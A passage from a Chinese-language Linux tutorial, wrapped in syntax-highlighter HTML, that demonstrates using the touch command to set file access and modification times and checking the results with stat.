class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@linuxtechi ~]# touch -m /mnt/nfsshare/\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d18402681496-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d18402681496-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93106d18402681496-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># touch -m /mnt/nfsshare/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d18402681496-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>使用 <code>stat</code> 交叉验证访问和修改时间：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93106d1b664475245\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@linuxtechi ~]# stat devops.txt\r\n  File: 'devops.txt'\r\n  Size: 0               Blocks: 0          IO Block: 4096   regular empty file\r\nDevice: fd00h/64768d    Inode: 67324178    Links: 1\r\nAccess: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)\r\nContext: unconfined_u:object_r:admin_home_t:s0\r\nAccess: 2018-03-30 00:06:20.145000000 -0400\r\nModify: 2018-03-30 00:06:20.145000000 -0400\r\nChange: 2018-03-30 00:06:20.145000000 -0400\r\n Birth: -\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d1b664475245-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d1b664475245-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d1b664475245-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d1b664475245-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d1b664475245-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d1b664475245-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d1b664475245-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d1b664475245-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d1b664475245-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d1b664475245-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d1b664475245-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93106d1b664475245-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># stat devops.txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d1b664475245-2\"> <span class=\"crayon-h\"> </span><span class=\"crayon-v\">File</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'devops.txt'</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d1b664475245-3\"> <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Size</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span>              <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Blocks</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span>         <span class=\"crayon-h\"> </span><span class=\"crayon-e\">IO </span><span class=\"crayon-v\">Block</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4096</span>  <span class=\"crayon-h\"> </span><span class=\"crayon-e\">regular </span><span class=\"crayon-e\">empty </span><span class=\"crayon-e\">file</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d1b664475245-4\"><span class=\"crayon-v\">Device</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fd00h</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">64768d</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Inode</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">67324178</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Links</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d1b664475245-5\"><span class=\"crayon-v\">Access</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0644</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Uid</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">/</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">)</span>  <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Gid</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">/</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d1b664475245-6\"><span class=\"crayon-v\">Context</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">unconfined_u</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">object_r</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">admin_home_t</span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">s0</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d1b664475245-7\"><span class=\"crayon-v\">Access</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">30</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">20.145000000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0400</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d1b664475245-8\"><span class=\"crayon-v\">Modify</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">30</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">20.145000000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0400</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d1b664475245-9\"><span class=\"crayon-v\">Change</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">30</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">20.145000000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0400</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d1b664475245-10\"> <span class=\"crayon-v\">Birth</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d1b664475245-11\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0032 seconds] -->\r\n<p></p>\n<h3 id=\"toc_6\">示例：7 将访问和修改时间设置为特定的日期和时间</h3>\n<p>每当我们使用 <code>touch</code> 命令更改文件和目录的访问和修改时间时，它将当前时间设置为该文件或目录的访问和修改时间。</p>\n<p>假设我们想要将特定的日期和时间设置为文件的访问和修改时间，这可以使用 <code>touch</code> 命令中的 <code>-c</code> 和 <code>-t</code> 选项来实现。</p>\n<p>日期和时间可以使用以下格式指定：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93106d1f296769106\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n{CCYY}MMDDhhmm.ss\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d1f296769106-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d1f296769106-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93106d1f296769106-1\"><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">CCYY</span><span class=\"crayon-sy\">}</span><span class=\"crayon-v\">MMDDhhmm</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">ss</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d1f296769106-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>其中：</p>\n<ul>\n<li><code>CC</code> – 年份的前两位数字</li>\n<li><code>YY</code> – 年份的后两位数字</li>\n<li><code>MM</code> – 月份 (01-12)</li>\n<li><code>DD</code> – 天 (01-31)</li>\n<li><code>hh</code> – 小时 (00-23)</li>\n<li><code>mm</code> – 分钟 (00-59)</li>\n</ul>\n<p>让我们将 <code>devops.txt</code> 文件的访问和修改时间设置为未来的一个时间（2025 年 10 月 19 日 18 时 20 分）。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93106d22282798665\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@linuxtechi ~]# touch -c -t 202510191820 devops.txt\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d22282798665-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d22282798665-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93106d22282798665-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># touch -c -t 202510191820 devops.txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d22282798665-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>使用 <code>stat</code> 命令查看更新访问和修改时间：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/1487299597cc1f3a1792992976c94fc6.jpg\" alt=\"stat-command-output-linux\"></p>\n<p>根据日期字符串设置访问和修改时间，在 <code>touch</code> 命令中使用 <code>-d</code> 选项，然后指定日期字符串，后面跟文件名。如下所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93106d25823164491\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@linuxtechi ~]# touch -c -d \"2010-02-07 20:15:12.000000000 +0530\" sysadm-29.txt\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d25823164491-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d25823164491-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93106d25823164491-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># touch -c -d \"2010-02-07 20:15:12.000000000 +0530\" sysadm-29.txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d25823164491-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>使用 <code>stat</code> 命令验证文件的状态：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93106d2b831141767\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@linuxtechi ~]# stat sysadm-20.txt\r\n  File: ‘sysadm-20.txt’\r\n  Size: 0               Blocks: 0          IO Block: 4096   regular empty file\r\nDevice: fd00h/64768d    Inode: 67324189    Links: 1\r\nAccess: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)\r\nContext: unconfined_u:object_r:admin_home_t:s0\r\nAccess: 2010-02-07 20:15:12.000000000 +0530\r\nModify: 2010-02-07 20:15:12.000000000 +0530\r\nChange: 2018-03-30 10:23:31.584000000 +0530\r\n Birth: -\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d2b831141767-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d2b831141767-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d2b831141767-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d2b831141767-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d2b831141767-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d2b831141767-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d2b831141767-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d2b831141767-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d2b831141767-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d2b831141767-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d2b831141767-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93106d2b831141767-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># stat sysadm-20.txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d2b831141767-2\"> <span class=\"crayon-h\"> </span><span class=\"crayon-v\">File</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span>‘<span class=\"crayon-v\">sysadm</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20.txt</span>’</div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d2b831141767-3\"> <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Size</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span>              <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Blocks</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span>         <span class=\"crayon-h\"> </span><span class=\"crayon-e\">IO </span><span class=\"crayon-v\">Block</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4096</span>  <span class=\"crayon-h\"> </span><span class=\"crayon-e\">regular </span><span class=\"crayon-e\">empty </span><span class=\"crayon-e\">file</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d2b831141767-4\"><span class=\"crayon-v\">Device</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fd00h</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">64768d</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Inode</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">67324189</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Links</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d2b831141767-5\"><span class=\"crayon-v\">Access</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0644</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Uid</span><span 